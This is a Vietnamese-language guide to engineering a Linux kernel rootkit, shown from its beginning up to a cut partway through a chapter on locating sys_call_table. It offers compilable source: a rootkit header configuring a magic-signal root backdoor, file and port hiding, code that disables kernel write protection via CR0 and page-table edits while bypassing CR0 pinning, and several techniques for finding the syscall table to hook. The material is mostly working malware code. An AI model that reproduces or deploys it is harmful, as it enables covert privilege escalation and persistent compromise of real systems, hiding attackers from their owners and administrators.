# Linux Kernel Rootkit — Complete Guide (All Techniques, Full Code)

> Tài liệu toàn diện về Linux kernel rootkit engineering.
> Mỗi kỹ thuật có **full compilable source code**, giải thích **từng dòng**, phân tích **tại sao APT chọn cách này**.
> Code tested trên kernel 5.15 LTS / 6.1 LTS / 6.6 LTS.
>
> **80 techniques** across 16 chapters + 11 appendices.
> 3 rounds of adversarial audit — all fixes applied inline.

---

## Mục lục tổng

**Part I — Core Rootkit Engineering (Ch 1-5)**
- Chapter 1: Kernel Module Framework
- Chapter 2: Tìm sys_call_table — 6 phương pháp
- Chapter 3: Syscall Table Hooking
- Chapter 4: Ftrace-based Hooking
- Chapter 5: Kprobe/Kretprobe Hooking

**Part II — Advanced Kernel Techniques (Ch 6-11)**
- Chapter 6: DKOM — Direct Kernel Object Manipulation
- Chapter 7: VFS Layer Hooking
- Chapter 8: Network Rootkit — Netfilter & Covert Channel
- Chapter 9: Inline Hooking / Live Patching
- Chapter 10: eBPF Rootkit
- Chapter 11: Privilege Escalation

**Part III — Operations & Infrastructure (Ch 12-16)**
- Chapter 12: Persistence — Survive Reboot
- Chapter 13: Anti-Forensics & Self-Protection
- Chapter 14: Covert Communication & C2
- Chapter 15: Tổng hợp — Full-featured Rootkit
- Chapter 16: Detection Engineering

**Part IV — Advanced Techniques (Appendices A-G)**
- Appendix A: Advanced Hooking (IDT, MSR, LSM)
- Appendix B: Advanced Hiding & Evasion
- Appendix C: Advanced Privilege Escalation (SELinux, Namespace)
- Appendix D: Advanced Persistence (DKMS, Boot Script)
- Appendix E: Advanced C2 (Timing Channel)
- Appendix F: Advanced Anti-Forensics (Code Integrity, Memory Forensics)
- Appendix G: Credential Theft (Keylogger, TTY Sniffing, /dev/kmem)

**Part V — Userspace, Exploitation & Detection (Appendices H-K)**
- Appendix H: Userspace Rootkit (LD_PRELOAD, GOT/PLT)
- Appendix I: Additional Kernel Techniques (ChaCha20 C2, Fileless, BPF, etc.)
- Appendix J: Exploitation Primitives (Kernel ROP, ret2usr, SMEP Bypass)
- Appendix K: Detection Engineering Additions

---


---

# Part I — Core Rootkit Engineering

## Chapter 1: Kernel Module Framework

### 1.1 Makefile chuẩn cho rootkit development

Makefile này hỗ trợ multi-file module, debug symbols, và cross-compilation.

```makefile
# Makefile — Production-grade cho kernel module development
#
# Cách dùng:
#   make                    → Build module cho kernel đang chạy
#   make KDIR=/path/to/src  → Build cho kernel khác
#   make debug              → Build với debug symbols
#   make clean              → Dọn dẹp

# Tên module output — thay đổi tên này cho mỗi project
MODULE_NAME := rk

# Source files — thêm .o cho mỗi .c file
# Khi build multi-file module, kernel build system sẽ:
#   1. Compile mỗi .o từ .c tương ứng
#   2. Link tất cả vào $(MODULE_NAME).ko
obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := main.o hooks.o hide.o netfilter.o util.o

# Kernel build directory — nơi chứa kernel headers + build system
# Mặc định = kernel đang chạy, override bằng KDIR=
KDIR ?= /lib/modules/$(shell uname -r)/build

# Thư mục source hiện tại
PWD := $(shell pwd)

# Compiler flags bổ sung
# -DDEBUG : enable pr_debug() output
# -Werror : warning = error, tránh bug subtle
ccflags-y := -Wall -Wextra -Wno-unused-parameter

# Target mặc định
all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

# Build với debug info (không strip symbols)
debug: ccflags-y += -DDEBUG -g -O0
debug:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	rm -f Module.symvers modules.order

# Cài module vào /lib/modules/$(uname -r)/extra/
install:
	$(MAKE) -C $(KDIR) M=$(PWD) modules_install
	depmod -a

.PHONY: all debug clean install
```

### 1.2 Header chung — Shared definitions

```c
/* rootkit.h — Header chung cho tất cả source files
 *
 * Mọi constant, struct, function prototype đều khai báo ở đây.
 * Tách header riêng vì rootkit thường có nhiều file .c
 * mỗi file đảm nhận một subsystem (hook, hide, net, ...).
 */

#ifndef _ROOTKIT_H
#define _ROOTKIT_H

#include <linux/init.h>       /* __init, __exit macros */
#include <linux/module.h>     /* MODULE_*, module_init/exit */
#include <linux/kernel.h>     /* printk, pr_info, pr_err */
#include <linux/syscalls.h>   /* __NR_* syscall numbers */
#include <linux/kallsyms.h>   /* kallsyms_lookup_name (nếu available) */
#include <linux/dirent.h>     /* linux_dirent64 struct */
#include <linux/namei.h>      /* kern_path, path_put */
#include <linux/fs.h>         /* file_operations, inode_operations */
#include <linux/proc_fs.h>    /* proc_create, proc_remove */
#include <linux/seq_file.h>   /* seq_file operations */
#include <linux/slab.h>       /* kmalloc, kfree */
#include <linux/uaccess.h>    /* copy_from_user, copy_to_user */
#include <linux/version.h>    /* LINUX_VERSION_CODE, KERNEL_VERSION */
#include <linux/kprobes.h>    /* kprobe, kretprobe */
#include <linux/ftrace.h>     /* ftrace_ops */
#include <linux/cred.h>       /* prepare_creds, commit_creds */
#include <linux/sched.h>      /* task_struct, current */
#include <linux/sched/signal.h> /* for_each_process */
#include <linux/tcp.h>        /* TCP structures */
#include <linux/string.h>     /* kernel string functions */
#include <asm/paravirt.h>     /* read_cr0 trên paravirt */
#include <asm/processor.h>    /* CR0 bit definitions */

/* ──────────────────────────────────────────────────────────────
 * CONFIGURATION — Thay đổi theo nhu cầu
 * ────────────────────────────────────────────────────────────── */

/* Prefix cho file/directory cần ẩn.
 * Bất kỳ entry nào có tên bắt đầu bằng prefix này sẽ invisible
 * cho ls, find, và bất kỳ chương trình nào dùng getdents64. */
#define HIDDEN_PREFIX    "rk_"

/* Signal number dùng làm magic trigger.
 * SIGRTMIN+20 = signal 54 trên hầu hết hệ thống.
 * Tại sao real-time signal: vì application bình thường không dùng,
 * giảm false positive trigger. */
#define MAGIC_SIGNAL     54

/* PID dùng trong kill() để trigger give-root.
 * kill(MAGIC_PID, MAGIC_SIGNAL) → current process trở thành root.
 * Dùng PID lớn bất thường để tránh trùng PID thật. */
#define MAGIC_PID        31337

/* Module visibility toggle PID.
 * kill(HIDE_MODULE_PID, MAGIC_SIGNAL) → ẩn/hiện module. */
#define HIDE_MODULE_PID  31338

/* Port cần ẩn khỏi netstat/ss */
#define HIDDEN_PORT      4444

/* ──────────────────────────────────────────────────────────────
 * COMPATIBILITY MACROS
 *
 * Kernel API thay đổi liên tục. Những macro này cho phép cùng
 * một codebase compile trên nhiều kernel versions.
 * ────────────────────────────────────────────────────────────── */

/* Kernel 4.17+ chuyển syscall handler sang dùng struct pt_regs *
 * thay vì nhận arguments trực tiếp.
 * 
 * Trước 4.17:  long sys_kill(pid_t pid, int sig)
 * Từ 4.17+:    long __x64_sys_kill(const struct pt_regs *regs)
 *              Với regs->di = pid, regs->si = sig
 *
 * Macro SYSCALL_PREFIX giúp tạo đúng tên function. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
  #define SYSCALL_PREFIX "__x64_sys_"
  /* Trên kernel mới, syscall handlers nhận pt_regs *.
   * Arguments nằm trong registers:
   *   regs->di = arg1 (rdi)
   *   regs->si = arg2 (rsi)
   *   regs->dx = arg3 (rdx)
   *   regs->r10 = arg4
   *   regs->r8  = arg5
   *   regs->r9  = arg6 */
  typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
#else
  #define SYSCALL_PREFIX "sys_"
  /* Trên kernel cũ, syscall handlers nhận args trực tiếp. */
#endif

/* Kernel 5.7+ unexport kallsyms_lookup_name.
 * Trước đó có thể gọi trực tiếp:
 *   unsigned long addr = kallsyms_lookup_name("sys_call_table");
 * Từ 5.7 trở đi phải dùng kprobe trick (xem Chapter 2). */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
  #define KPROBE_LOOKUP 1
#endif

/* Kernel 6.2+ đổi cách set CR0 — native_write_cr0 bị unexport.
 * Phải dùng inline assembly trực tiếp. */

/* ──────────────────────────────────────────────────────────────
 * FUNCTION PROTOTYPES — Khai báo cho các module files
 * ────────────────────────────────────────────────────────────── */

/* util.c — Utility functions */
unsigned long rk_lookup_name(const char *name);
void rk_write_cr0(unsigned long val);
void rk_protect_memory(void);
void rk_unprotect_memory(void);

/* hooks.c — Syscall hooking */
int  rk_install_hooks(void);
void rk_remove_hooks(void);

/* hide.c — Hiding mechanisms */
void rk_hide_module(void);
void rk_show_module(void);
void rk_hide_process(pid_t pid);
void rk_show_process(pid_t pid);

/* netfilter.c — Network operations */
int  rk_net_init(void);
void rk_net_cleanup(void);

#endif /* _ROOTKIT_H */
```

### 1.3 Utility Functions — Nền tảng kỹ thuật

```c
/* util.c — Core utility functions mà mọi technique đều cần
 *
 * File này chứa những building blocks:
 * 1. Symbol lookup (tìm address của kernel function/variable)
 * 2. Memory protection toggle (để ghi vào read-only pages)
 * 3. Helper functions chung
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * SYMBOL LOOKUP
 *
 * Đây là thao tác cơ bản nhất: tìm address của symbol trong kernel.
 * "Symbol" = function name hoặc variable name.
 * Ví dụ: tìm address của sys_call_table, commit_creds, etc.
 *
 * Tại sao cần: kernel không export mọi symbol cho modules.
 * sys_call_table là unexported symbol — module không thể dùng
 * trực tiếp. Phải tự tìm address bằng các trick.
 *
 * KASLR (Kernel Address Space Layout Randomization) khiến address
 * thay đổi mỗi lần boot → KHÔNG thể hardcode address.
 * ══════════════════════════════════════════════════════════════ */

#ifdef KPROBE_LOOKUP
/*
 * Kprobe Trick — Phương pháp chính cho kernel >= 5.7
 *
 * Bối cảnh:
 *   Kernel 5.7 commit b80e44d... unexport kallsyms_lookup_name().
 *   Lý do: giảm attack surface — module không nên tìm arbitrary symbols.
 *   Nhưng kprobes API vẫn cần resolve symbols internally.
 *
 * Trick:
 *   1. register_kprobe() nhận .symbol_name = "target_function"
 *   2. Kernel tự resolve symbol name → address (dùng kallsyms internally)
 *   3. Sau register, kp.addr = resolved address
 *   4. Unregister ngay — ta chỉ cần address, không cần probe
 *
 * Tại sao hoạt động:
 *   register_kprobe() gọi kprobe_lookup_name() nội bộ,
 *   function này vẫn access kallsyms. Kernel team chưa block
 *   vector này (tính đến kernel 6.8).
 *
 * Giới hạn:
 *   CONFIG_KPROBES=y phải được bật (mặc định trên hầu hết distros).
 *   Một số kernel lockdown modes chặn kprobes.
 */
static unsigned long kprobe_lookup(const char *name)
{
    struct kprobe kp = {
        .symbol_name = name    /* Tên symbol cần tìm */
    };
    unsigned long addr;
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        /* Có thể fail vì:
         * - Symbol không tồn tại (typo, kernel version khác)
         * - CONFIG_KPROBES=n
         * - Kernel lockdown mode chặn kprobes
         * - Symbol nằm trong __init section (đã freed sau boot) */
        pr_err("rk: kprobe register failed for %s: %d\n", name, ret);
        return 0;
    }

    /* kp.addr bây giờ chứa address đã resolve.
     * Cast sang unsigned long vì ta dùng nó như raw address. */
    addr = (unsigned long)kp.addr;

    /* Unregister ngay — ta không thực sự muốn probe function này.
     * Để kprobe registered sẽ:
     * 1. Tốn resource (mỗi kprobe chèn breakpoint vào code)
     * 2. Gây chậm (breakpoint = trap mỗi lần function chạy)
     * 3. Dễ bị detect (admin list kprobes → thấy ngay) */
    unregister_kprobe(&kp);

    return addr;
}
#endif /* KPROBE_LOOKUP */

/*
 * rk_lookup_name() — Unified symbol lookup interface
 *
 * Wraps phương pháp phù hợp tùy kernel version:
 * - Kernel < 5.7: dùng kallsyms_lookup_name() trực tiếp
 * - Kernel >= 5.7: dùng kprobe trick
 *
 * Input:  name = tên symbol (e.g., "sys_call_table")
 * Output: virtual address của symbol, hoặc 0 nếu không tìm thấy
 */
unsigned long rk_lookup_name(const char *name)
{
#ifdef KPROBE_LOOKUP
    return kprobe_lookup(name);
#else
    return kallsyms_lookup_name(name);
#endif
}

/* ══════════════════════════════════════════════════════════════
 * MEMORY PROTECTION TOGGLE
 *
 * Context:
 *   Kernel text và data quan trọng (như sys_call_table) nằm trong
 *   read-only memory pages. Khi CONFIG_STRICT_KERNEL_RWX=y
 *   (mặc định trên mọi distro), ghi vào sẽ gây page fault → crash.
 *
 * CR0 register (Control Register 0):
 *   Bit 16 = WP (Write Protect)
 *   - WP=1: CPU enforce page-level write protection
 *           Ring 0 code KHÔNG được ghi vào read-only pages
 *   - WP=0: Ring 0 code CÓ THỂ ghi vào read-only pages
 *           (Ring 3 vẫn bị chặn)
 *
 * Flow:
 *   1. rk_unprotect_memory(): clear CR0.WP → cho phép ghi
 *   2. Thực hiện ghi (ví dụ: thay syscall table entry)
 *   3. rk_protect_memory(): set CR0.WP → bật lại protection
 *
 * SMP concerns:
 *   CR0 là per-CPU register. Mỗi CPU core có CR0 riêng.
 *   Nếu chỉ clear WP trên CPU hiện tại, core khác vẫn enforced.
 *   Trong practice, ta chỉ cần clear trên CPU đang chạy code này,
 *   vì ghi syscall table là atomic (sizeof pointer = 8 bytes).
 *
 * Detection risk:
 *   Thay đổi CR0 rất dễ detect:
 *   - LKRG monitor CR0 changes
 *   - Hardware performance counters có thể flag
 *   - Giữ WP=0 lâu = security violation detectable
 *   Nên unprotect → write → protect càng nhanh càng tốt.
 *
 * Alternative (hiện đại hơn): 
 *   set_memory_rw()/set_memory_ro() — thay đổi page table thay vì CR0.
 *   An toàn hơn nhưng cần biết page-aligned address.
 *   Xem phần sau.
 * ══════════════════════════════════════════════════════════════ */

/*
 * Inline assembly để ghi CR0 trực tiếp.
 *
 * Tại sao inline asm thay vì native_write_cr0():
 *   Kernel 5.3+ thêm pinning cho CR0.WP bit trong native_write_cr0():
 *   nếu detect code cố clear WP, kernel WARN và set lại.
 *   Bằng cách dùng inline asm, ta bypass check này.
 *
 *   "mov %0, %%cr0" : load giá trị từ biến C vào CR0
 *   "r"(val)         : val nằm trong bất kỳ general register nào
 *   "memory"         : compiler barrier — flush pending writes
 *
 * CẢNH BÁO: từ kernel 6.2+, một số config bổ sung thêm check
 * bằng hardware (CR0 pinning via hypervisor). Nếu chạy trong VM
 * có hypervisor protection, trick này có thể fail.
 */
void rk_write_cr0(unsigned long val)
{
    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
}

/*
 * Tắt write protection — cho phép ghi vào read-only kernel memory.
 *
 * CRITICAL SECTION: từ lúc gọi function này đến lúc gọi
 * rk_protect_memory(), kernel memory KHÔNG ĐƯỢC BẢO VỆ.
 * Bất kỳ bug nào ghi vào wrong address = kernel corruption.
 *
 * preempt_disable(): ngăn scheduler switch task trên CPU này.
 * Tại sao: nếu bị preempt trong khi WP=0, task khác chạy
 * với WP=0 có thể gây unpredictable behavior.
 * Và nếu bị migrate sang CPU khác, CR0 của CPU cũ vẫn WP=0.
 */
void rk_unprotect_memory(void)
{
    unsigned long cr0;

    preempt_disable();              /* Không cho scheduler switch */

    cr0 = read_cr0();               /* Đọc CR0 hiện tại */

    /* Clear bit 16 (WP) bằng AND với bitmask.
     * 0x10000 = 1 << 16 = WP bit
     * ~0x10000 = tất cả bit 1 NGOẠI TRỪ bit 16
     * cr0 & ~0x10000 = giữ nguyên mọi bit, clear WP */
    rk_write_cr0(cr0 & ~0x00010000UL);
}

/*
 * Bật lại write protection — restore trạng thái bình thường.
 *
 * Gọi NGAY SAU KHI ghi xong. Giữ WP=0 lâu = risk.
 */
void rk_protect_memory(void)
{
    unsigned long cr0;

    cr0 = read_cr0();

    /* Set bit 16 (WP) bằng OR.
     * cr0 | 0x10000 = giữ nguyên mọi bit, set WP = 1 */
    rk_write_cr0(cr0 | 0x00010000UL);

    preempt_enable();               /* Cho phép scheduler lại */
}

/* ══════════════════════════════════════════════════════════════
 * ALTERNATIVE: set_memory_rw / set_memory_ro
 *
 * Thay đổi page table entries thay vì CR0.
 * An toàn hơn vì:
 *   1. Chỉ affect pages cụ thể, không disable toàn bộ protection
 *   2. Kernel API chính thức (mặc dù designed cho module use)
 *   3. Không trigger CR0 monitoring
 *
 * Nhược điểm:
 *   - Address phải page-aligned (4096-byte boundary)
 *   - Một số kernel restrict function này cho built-in code only
 *   - set_memory_rw() có thể bị monitor bởi LSM
 * ══════════════════════════════════════════════════════════════ */

#include <asm/set_memory.h>

static int rk_make_rw(unsigned long addr, int numpages)
{
    /* set_memory_rw() thay đổi PTE (Page Table Entry):
     *   Clear _PAGE_RO bit → page trở thành writable
     *
     * addr PHẢI là page-aligned:
     *   addr & ~(PAGE_SIZE - 1) = addr rounded down to page boundary
     *
     * numpages: số pages cần thay đổi. Syscall table thường
     *           nằm gọn trong 1-2 pages. */
    unsigned long page_addr = addr & PAGE_MASK;  /* PAGE_MASK = ~(PAGE_SIZE-1) */
    return set_memory_rw(page_addr, numpages);
}

static int rk_make_ro(unsigned long addr, int numpages)
{
    unsigned long page_addr = addr & PAGE_MASK;
    return set_memory_ro(page_addr, numpages);
}

/* ══════════════════════════════════════════════════════════════
 * PTE MANIPULATION — Phương pháp thấp nhất (level thấp nhất)
 *
 * Trực tiếp walk page table và sửa PTE bits.
 * Không dùng bất kỳ kernel API nào → khó detect.
 * Nhưng phức tạp nhất và dễ crash nhất.
 * ══════════════════════════════════════════════════════════════ */

#include <asm/pgtable.h>  /* pgd_t, p4d_t, pud_t, pmd_t, pte_t */

/*
 * Walk 4/5-level page table để tìm PTE cho virtual address.
 *
 * x86-64 paging structure (4-level, 48-bit VA):
 *
 *   Virtual Address (48 bits used):
 *   ┌──────┬──────┬──────┬──────┬──────────┐
 *   │PGD(9)│PUD(9)│PMD(9)│PTE(9)│Offset(12)│
 *   └──┬───┴──┬───┴──┬───┴──┬───┴────┬─────┘
 *      │      │      │      │        │
 *      ▼      ▼      ▼      ▼        ▼
 *    CR3 → PGD → PUD → PMD → PTE → Physical Page + Offset
 *    (PML4)  (PDPT)   (PD)   (PT)
 *
 *   5-level paging thêm P4D giữa PGD và PUD.
 *   Kernel abstract điều này: nếu 5-level disable,
 *   p4d_offset() trả về PGD entry (transparent).
 *
 * Return: pte_t* pointing to the PTE, hoặc NULL nếu unmapped.
 */
static pte_t *rk_walk_page_table(unsigned long addr)
{
    pgd_t *pgd;       /* Page Global Directory (Level 4 / PML4) */
    p4d_t *p4d;       /* Page 4 Directory (Level 5, nếu có) */
    pud_t *pud;       /* Page Upper Directory (Level 3 / PDPT) */
    pmd_t *pmd;       /* Page Middle Directory (Level 2 / PD) */
    pte_t *pte;       /* Page Table Entry (Level 1 / PT) */

    /* Kernel addresses (above PAGE_OFFSET) MUST use init_mm.
     * init_mm.pgd = CR3 value cho kernel mapping.
     * Với KPTI (Kernel Page Table Isolation), process page tables
     * chỉ map minimal kernel stub — không chứa full kernel mapping.
     * Rootkit chỉ manipulate kernel pages, nên luôn dùng init_mm. */
    pgd = pgd_offset(&init_mm, addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd))
        return NULL;

    /* P4D — chỉ meaningful khi 5-level paging.
     * Trên 4-level, p4d_offset() = identity (return pgd). */
    p4d = p4d_offset(pgd, addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d))
        return NULL;

    pud = pud_offset(p4d, addr);
    if (pud_none(*pud) || pud_bad(*pud))
        return NULL;

    /* Check nếu PUD maps huge page (1GB page).
     * Nếu là huge page, không có PMD/PTE levels. */
    if (pud_large(*pud))
        return (pte_t *)pud;

    pmd = pmd_offset(pud, addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd))
        return NULL;

    /* Check nếu PMD maps huge page (2MB page). */
    if (pmd_large(*pmd))
        return (pte_t *)pmd;

    pte = pte_offset_kernel(pmd, addr);
    if (pte_none(*pte))
        return NULL;

    return pte;
}

/*
 * Thay đổi write permission bằng PTE manipulation.
 *
 * Ưu điểm so với CR0 trick:
 *   - Chỉ affect 1 page, không disable toàn bộ WP
 *   - Không trigger CR0 monitoring
 *
 * Ưu điểm so với set_memory_rw():
 *   - Không dùng exported kernel API → khó trace
 *   - set_memory_rw() có thể bị restricted
 */
static int rk_set_page_rw(unsigned long addr)
{
    pte_t *pte = rk_walk_page_table(addr);
    if (!pte)
        return -EINVAL;

    /* pte_mkwrite() set _PAGE_RW bit trong PTE entry.
     * Phải flush TLB sau khi thay đổi PTE, nếu không
     * CPU cache PTE cũ → thay đổi không có effect. */
    *pte = pte_mkwrite(*pte);

    /* Flush TLB cho address này trên tất cả CPUs.
     * __flush_tlb_one_kernel() chỉ flush trên CPU hiện tại.
     * Nếu cần SMP-safe: dùng flush_tlb_kernel_range(). */
    __flush_tlb_one_kernel(addr);

    return 0;
}

static int rk_set_page_ro(unsigned long addr)
{
    pte_t *pte = rk_walk_page_table(addr);
    if (!pte)
        return -EINVAL;

    *pte = pte_wrprotect(*pte);
    __flush_tlb_one_kernel(addr);

    return 0;
}
```

---

## Chapter 2: Tìm sys_call_table

### 2.1 Tại sao sys_call_table quan trọng?

```
sys_call_table là mảng gồm ~450 function pointers (tùy kernel version).

Index = syscall number (__NR_read = 0, __NR_write = 1, ...)
Value = address của handler function

Khi user process gọi syscall:
  1. CPU thực hiện SYSCALL instruction
  2. Kernel entry code đọc RAX (syscall number)
  3. Lookup: handler = sys_call_table[rax]
  4. Call handler(regs)

Hook = thay sys_call_table[N] bằng address function của ta.
Sau đó, MỌI process gọi syscall N sẽ chạy code của ta thay vì code thật.

Đây là kỹ thuật rootkit cổ điển nhất, tồn tại từ Linux 2.x.
```

### 2.2 — 6 phương pháp tìm sys_call_table

```c
/* syscall_table_finder.c — Tất cả phương pháp tìm sys_call_table
 *
 * Compile riêng để test: chỉ cần file này + rootkit.h
 * insmod → dmesg xem kết quả → rmmod
 *
 * Mục đích: tìm virtual address của sys_call_table[].
 * Address này thay đổi mỗi lần boot (KASLR).
 * Phải tìm lại mỗi lần module load.
 */

#include "rootkit.h"

static unsigned long *sys_call_table_addr = NULL;

/* ──────────────────────────────────────────────────────────────
 * METHOD 1: kallsyms_lookup_name() — Kernel < 5.7
 *
 * Đơn giản nhất. Kernel export function này cho modules.
 * Hoạt động giống nm/objdump nhưng runtime.
 *
 * Bị unexport từ 5.7 vì:
 * - Kernel team cho rằng modules không nên tìm arbitrary symbols
 * - Giảm attack surface cho LKM rootkits
 * ────────────────────────────────────────────────────────────── */
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
static unsigned long *method_1_kallsyms(void)
{
    unsigned long *table;

    table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!table) {
        pr_err("method_1: kallsyms_lookup_name failed\n");
        return NULL;
    }

    pr_info("method_1 (kallsyms): sys_call_table @ 0x%lx\n",
            (unsigned long)table);
    return table;
}
#endif

/* ──────────────────────────────────────────────────────────────
 * METHOD 2: Kprobe trick — Kernel >= 5.7 (phổ biến nhất)
 *
 * Đã giải thích trong util.c. Dùng rk_lookup_name() wrapper.
 *
 * Đây là phương pháp được hầu hết rootkit hiện đại sử dụng:
 * Diamorphine, Reptile, Kovid đều dùng trick này.
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_2_kprobe(void)
{
    unsigned long *table;

    table = (unsigned long *)rk_lookup_name("sys_call_table");
    if (!table) {
        pr_err("method_2: kprobe lookup failed\n");
        return NULL;
    }

    pr_info("method_2 (kprobe): sys_call_table @ 0x%lx\n",
            (unsigned long)table);
    return table;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 3: MSR_LSTAR scan — Không dùng bất kỳ lookup API
 *
 * Nguyên lý:
 *   MSR_LSTAR (Model Specific Register 0xC0000082) chứa address
 *   của entry_SYSCALL_64 — entry point khi CPU thực hiện SYSCALL.
 *
 *   entry_SYSCALL_64 (assembly code) sẽ:
 *   1. Save registers
 *   2. Lookup sys_call_table[rax]    ← CÓ REFERENCE TỚI TABLE
 *   3. Call handler
 *
 *   Ta đọc MSR_LSTAR → lấy address entry_SYSCALL_64
 *   → scan code bytes tìm pattern reference tới sys_call_table.
 *
 * Ưu điểm:
 *   - Không dùng kallsyms hay kprobes
 *   - Hoạt động trên mọi kernel version
 *   - Khó detect vì chỉ đọc MSR và scan memory
 *
 * Nhược điểm:
 *   - Pattern-dependent → có thể break khi kernel code thay đổi
 *   - Phải hiểu x86 instruction encoding
 *
 * Sử dụng bởi: SucKIT rootkit (historic), một số APT tools
 * ────────────────────────────────────────────────────────────── */
static unsigned long *method_3_msr_scan(void)
{
    unsigned long msr_value;
    unsigned char *code_ptr;
    unsigned long *table = NULL;
    int i;

    /* Đọc MSR_LSTAR = IA32_LSTAR (0xC0000082)
     *
     * rdmsrl() = Read MSR Long — đọc 64-bit MSR value.
     * MSR là per-CPU register, nhưng LSTAR thường giống nhau
     * trên tất cả cores (kernel set cùng giá trị).
     *
     * msr_value = virtual address của entry_SYSCALL_64 */
    rdmsrl(MSR_LSTAR, msr_value);
    pr_info("method_3: MSR_LSTAR = 0x%lx\n", msr_value);

    code_ptr = (unsigned char *)msr_value;

    /* Scan entry_SYSCALL_64 code tìm reference tới sys_call_table.
     *
     * Kernel code (entry_64.S) chứa instruction dạng:
     *   call *sys_call_table(, %rax, 8)
     *
     * Encoding x86-64:
     *   ff 14 c5 [4-byte displacement]
     *
     *   ff 14 c5 = call *disp32(,%rax,8)
     *   Nghĩa: gọi function tại address (disp32 + rax * 8)
     *   disp32 = 32-bit sign-extended address (lower 32 bits của sys_call_table)
     *
     * Trên kernel mới (>= 4.17), pattern có thể khác:
     *   mov sys_call_table(, %rax, 8), %rax
     *   call *%rax
     *   → Pattern: 48 8b 04 c5 [disp32]
     *
     * Ta scan cả hai patterns.
     */
    for (i = 0; i < 1024; i++) {
        /* Pattern 1: ff 14 c5 xx xx xx xx
         *            call *table(,%rax,8) */
        if (code_ptr[i] == 0xff &&
            code_ptr[i + 1] == 0x14 &&
            code_ptr[i + 2] == 0xc5) {

            /* Extract 4-byte displacement.
             * Đây là lower 32 bits của sys_call_table address.
             *
             * Trên x86-64, kernel addresses bắt đầu từ 0xFFFF...
             * nhưng instruction chỉ encode 32 bits.
             * Sign extension: 32-bit value bị sign-extend lên 64-bit.
             * Nếu bit 31 = 1 → upper 32 bits = 0xFFFFFFFF.
             *
             * Ví dụ: displacement = 0x82200300
             * Sign-extended = 0xFFFFFFFF82200300
             * → đây là kernel virtual address.
             */
            int disp32 = *(int *)(code_ptr + i + 3);
            table = (unsigned long *)((long)disp32);

            pr_info("method_3 (MSR scan pattern 1): "
                    "sys_call_table @ 0x%lx\n", (unsigned long)table);
            return table;
        }

        /* Pattern 2: 48 8b 04 c5 xx xx xx xx
         *            mov table(,%rax,8), %rax
         * 48 = REX.W prefix (64-bit operand)
         * 8b = MOV r64, r/m64
         * 04 c5 = ModR/M + SIB for disp32(,%rax,8) */
        if (code_ptr[i]     == 0x48 &&
            code_ptr[i + 1] == 0x8b &&
            code_ptr[i + 2] == 0x04 &&
            code_ptr[i + 3] == 0xc5) {

            int disp32 = *(int *)(code_ptr + i + 4);
            table = (unsigned long *)((long)disp32);

            pr_info("method_3 (MSR scan pattern 2): "
                    "sys_call_table @ 0x%lx\n", (unsigned long)table);
            return table;
        }
    }

    pr_err("method_3: no pattern found in entry_SYSCALL_64\n");
    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 4: IDT scan — Dùng Interrupt Descriptor Table
 *
 * Nguyên lý:
 *   INT 0x80 (legacy 32-bit syscall) vẫn tồn tại trên x86-64.
 *   IDT entry 0x80 chứa handler cho INT 0x80.
 *   Handler này cũng reference ia32_sys_call_table.
 *   Từ đó trace tới sys_call_table.
 *
 * Ít tin cậy hơn MSR scan nhưng là fallback hữu ích.
 * ────────────────────────────────────────────────────────────── */

/* IDT Entry structure (x86-64) — 16 bytes per entry */
struct idt_entry_t {
    u16 offset_low;    /* Bits 0-15 của handler address */
    u16 segment;       /* Code segment selector */
    u8  ist;           /* Interrupt Stack Table index */
    u8  type_attr;     /* Type and attributes (P, DPL, type) */
    u16 offset_mid;    /* Bits 16-31 */
    u32 offset_high;   /* Bits 32-63 */
    u32 reserved;      /* Phải là 0 */
} __attribute__((packed));

static unsigned long *method_4_idt_scan(void)
{
    struct desc_ptr idtr;
    struct idt_entry_t *idt;
    unsigned long handler_addr;
    unsigned char *handler;
    int i;

    /* SIDT instruction lưu IDT Register vào memory.
     * idtr.address = base address của IDT
     * idtr.size = size của IDT (256 entries * 16 bytes - 1)
     *
     * IDT không bị randomize bởi KASLR (nó nằm fixed trong
     * kernel BSS section), nhưng handler addresses bên trong
     * đã bị randomize. */
    asm volatile("sidt %0" : "=m"(idtr));

    idt = (struct idt_entry_t *)idtr.address;

    /* Reconstruct handler address từ IDT entry #0x80
     * (Legacy syscall interrupt — INT 0x80)
     *
     * Address bị split thành 3 parts trong IDT entry:
     *   [offset_high:offset_mid:offset_low] = 64-bit address */
    handler_addr = ((unsigned long)idt[0x80].offset_high << 32)
                 | ((unsigned long)idt[0x80].offset_mid  << 16)
                 | ((unsigned long)idt[0x80].offset_low);

    pr_info("method_4: INT 0x80 handler @ 0x%lx\n", handler_addr);

    /* Scan handler code tìm reference tới ia32_sys_call_table
     * hoặc sys_call_table. Pattern tương tự MSR scan. */
    handler = (unsigned char *)handler_addr;
    for (i = 0; i < 1024; i++) {
        if (handler[i] == 0xff &&
            handler[i + 1] == 0x14 &&
            handler[i + 2] == 0xc5) {
            int disp32 = *(int *)(handler + i + 3);
            unsigned long *table = (unsigned long *)((long)disp32);
            pr_info("method_4 (IDT): ia32 table @ 0x%lx\n",
                    (unsigned long)table);
            /* Đây có thể là ia32_sys_call_table (32-bit compat).
             * Cần thêm logic để tìm 64-bit sys_call_table từ đây. */
            return table;
        }
    }

    return NULL;
}

/* ──────────────────────────────────────────────────────────────
 * METHOD 5: Brute-force memory scan
 *
 * Nguyên lý:
 *   Biết address của một vài syscall handlers (qua kprobe),
 *   scan kernel memory tìm array chứa những addresses đó
 *   theo đúng thứ tự = sys_call_table.
 *
